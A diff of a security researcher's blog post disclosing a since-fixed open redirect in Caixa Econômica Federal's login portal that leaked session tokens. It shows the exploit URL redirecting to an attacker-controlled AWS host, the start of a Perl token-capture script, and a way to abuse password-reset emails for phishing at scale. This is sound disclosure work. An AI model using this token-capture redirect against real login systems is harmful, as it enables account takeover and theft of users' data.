@@ -1,7 +1,7 @@
 ---
 layout: content
 title: 'From an Open Redirect in a Brazilian Bank to Session Token Leak'
-description: 'Through a vulnerability on the financial institution website it was possible leak the users session token and realize a account takeover'
+description: 'Through an open redirect on the financial institution website it was possible leak the users session token and realize an account takeover'
 og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
 ---
 
@@ -17,59 +17,55 @@ Table of contents:
 
 ### Summary
 
-I recently started to test the security of Web and Mobile Applications of some Brazilian banks that I use, I'm not sure why this initiative, maybe it's just the feeling of wanting to find more restricted vulnerabilities than the common ones. From that I found some vulnerabilities that surprised me somewhat, often being simple vulnerabilities that can be quickly fixed but have a significant impact.
+This publication aims to share an Open Redirect vulnerability[1] discovered on the Caixa Econômica Federal website, through which it was possible to expose user Session Tokens.
 
-In this post I want to share, an Open Redirect vulnerability [[1]](#references) that I found on the Caixa Econômica Federal website where I was able to leak the users' Session Token.
+It should be clarified that during all tests, the only account used was the one for which authorization was granted by the account holder. No other user accounts or information were accessed or violated during the development of this research and proof of concept.
 
-It is worth clarifying that during all tests the only account used was mine and no other accounts or information from other users were accessed or violated during the development of this research/proof of concept.
-
-```
 Timeline:
 
-01/01/2020: Find of this vulnerability and made the proof of concept; 
+```plaintext
+01/01/2020: Vulnerability discovered and proof of concept created;
 01/05/2020: The vulnerability was reported;
-01/07/2020: Confirmation from Caixa Economica Federal;
-01/10/2020: This vulnerability was fixed;
-01/10/2020: Full disclosure;
+01/07/2020: Vulnerability confirmed by Caixa Econômica Federal;
+01/10/2020: Vulnerability fixed;
+01/10/2020: Technical article published;
 ```
 
 ---
 
 ### Description
 
-While browsing the web pages of the Caixa Federal systems, I came across an authentication screen where access credentials were requested:
+While navigating the Caixa Federal systems' web pages, an authentication screen was identified, asking for access credentials such as CPF (similar to Social Security Number), NIS, email, and a password. The page in question is the authentication screen for accessing the Portal Cidadão dashboard.
 
 ![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)
 
 -
 
-This page is the authentication screen for access to the citizen portal panel and this caught my eye because I took a closer look at the URL structure of the page in question to understand a little more about the system, to my surprise there was a parameter that could probably lead me to find a vulnerability.
-
 The URL in question was as follows:
 
 [http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()
 
-The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**; The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.
+The last parameter in the URL presents a potential Open Redirect vulnerability: &redirect_uri=. The value inserted in this parameter indicates the URL to which the user will be redirected after completing the login process.
 
-In order to validate this theory, I changed the value of the **&redirect_uri=** parameter in the original URL to the Google homepage address, filled in my credentials, logged in, and the result was as follows:
+To validate this, the value of the &redirect_uri= parameter in the original URL was changed to the Google homepage URL. After entering valid credentials and logging in, the following result was obtained:
 
 <iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
 
 -
 
-Well, here we have the Open Redirect vulnerability. To my surprise, however, I was not just redirected to the page, and during the redirect another parameter was sent. We can see this at the URL:
+As shown, the application has an Open Redirect vulnerability. However, another detail was noticed: during the redirection, an additional parameter was sent, as observed in the URL:
 
 [https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)
 
-This content in the **“?code=”** parameter aroused my curiosity. Understanding a little more of the original request, I was able to conclude that the value of this parameter is a Session Token.
+After analyzing the ?code= parameter and the original request, it was verified that the value of this parameter corresponds to a Session Token[[2]](#references).
 
-As I understood this, it became apparent that this vulnerability was even more critical than it appeared, as the user could be redirected to a malicious URL where I had full control over it and capture the Session Token [[2]](#references). Doing so could access that user's account, thereby violating the confidentiality of their data and the integrity of it.
+With this finding, it became evident that this vulnerability has a high severity, as the user could fall victim to an attack where they are redirected to a malicious URL controlled by an attacker, who can capture the Session Token. By doing so, the attacker gains access to the user's account, compromising the confidentiality and integrity of their data.
 
 ---
 
 ### Proof Of Concept
 
-Determined to create a PoC from this theory, I wrote the following code:
+To demonstrate the possibility of token leakage and capture, the following code was used:
 
 ```perl
 #!/usr/bin/env perl
@@ -100,41 +96,35 @@ app -> start();
 
 -
 
-This code is responsible for capturing and storing Session Tokens what are sent to the "malicious" URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed. The PoC URL was as follows:
+This code is responsible for capturing and storing Session Tokens sent to a "malicious" URL controlled by the attacker. In addition to capturing the Session Token and storing it in a log file, the script redirects the user back to the legitimate URL, ensuring they obtain a valid session on the Caixa Federal system. As such, it is unlikely that an average user would realize they are being deceived. The proof of concept URL is structured as follows:
 
 [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
 
-And this was the result:
+The result obtained can be observed in this recording:
 
 <iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
 
 --
 
-The PoC performed was relatively simple, capturing only the Session Token, but other information could be captured, such as, but not limited to: User IP, Browser UserAgent. This way we could know your browser, operating system, screen size and other even more critical information - such information could be used for example to make a fingerprint of the user.
+The attack surface in this scenario is still limited, requiring the user to access the URL themselves (via phishing or social engineering).
 
-The attack surface here is still somewhat restricted, requiring the user to enter the URL of their own accord (through phishing and/or social engineering) and certain users are already aware of it, thinking about it, I kept looking a more convincing way to send this malicious link to the user.
+In addition to this vulnerability, it was discovered that the value of the &redirect_uri= parameter present on the page is also used in the email when a user requests a password reset through the "Register/Forgot my password" button. To use this functionality, we can fill in the victim's email or CPF. After filling out the information, a link with the malicious value injected to set the new password is sent by email.
 
--
-
-Within minutes I could find a way to do this:
-
-On the same page, there is a function to request the password change, in the button “Register/Forgot Password”, where the user's email or Social Security Number is requested. After filling in the information, a link to register the new password is sent. via email.
-
-Asking for a new password from the malicious URL, the email content will be as follows:
+When requesting a new password from the malicious URL, the content of the email will be as follows:
 
 ![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)
 
 -
 
-The email is sent by an official Caixa Federal system, however, if we look at the link, we can see that the URL is "infected" by the URL under my ownership. I accessed the link, filled in the password reset and again the redirection worked, along with that, the Session Token Leak also happened.
+The email is sent by an official Caixa Federal system. However, upon examining the link, we can see that the URL is "infected" with the attacker's link. When accessing the link and completing the password reset, the redirection still occurs, resulting in the leakage of the Session Token.
 
-This way, I can use this mechanism to send emails requesting a password reset on behalf of Caixa Econômica Federal, creating greater reliability for the user to access my malicious link, and this attack can be performed on a large scale, since I only need the target's CPF (Social Security Number).
+Thus, an attacker can use this mechanism to send emails requesting password resets on behalf of Caixa Econômica Federal, lending greater credibility to the malicious link. This attack can be performed on a large scale, as only the target's CPF is required.
 
 ---
 
 ### Impact
 
-If an attacker exploits these vulnerabilities, he will be able to view some confidential user information, below I will leave some examples:
+If this vulnerability were exploited, an attacker could view confidential user information as demonstrated below:
 
 ![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)
 
@@ -156,11 +146,9 @@ If an attacker exploits these vulnerabilities, he will be able to view some conf
 
 ### Conclusion
 
-An attacker could easily exploit the vulnerabilities mentioned above and thus violate the confidentiality of various legitimate user accounts by accessing confidential information and in some cases also violating the integrity of some specific information.
+An attacker could exploit the vulnerabilities mentioned above to breach the confidentiality of several legitimate Caixa Econômica Federal user accounts.
 
-The effort to perform this exploration is relatively small and simple, but the range of this attack is extremely large.
-
-I strongly believe that this vulnerability was being exploited by malicious people to perform some types of scams by redirecting the user to phishing and related pages. I hope the Caixa Federal recognizes this scenario and conducts a survey to measure the real internal impact of this vulnerability and whether it was actually used by criminals.
+It was advised that Caixa Econômica Federal conduct an investigation to verify whether these vulnerabilities were being exploited by malicious actors in conducting fraud.
 
 ---
 
